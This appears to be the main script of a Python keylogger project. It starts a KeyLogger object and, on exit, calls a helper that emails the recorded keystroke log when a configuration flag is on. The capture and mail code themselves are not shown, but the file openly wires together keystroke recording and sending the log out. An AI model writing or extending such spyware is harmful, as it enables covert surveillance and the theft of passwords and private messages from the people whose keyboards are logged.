# app.py

from logger.keylogger import KeyLogger
from utils.mailer import send_email_with_log
from config import SEND_EMAIL_ON_EXIT

def main():
    try:
        keylogger = KeyLogger()
        keylogger.start()
    except KeyboardInterrupt:
        print("[*] KeyboardInterrupt received. Exiting cleanly.")
    finally:
        if SEND_EMAIL_ON_EXIT:
            send_email_with_log()

if __name__ == "__main__":
    main()
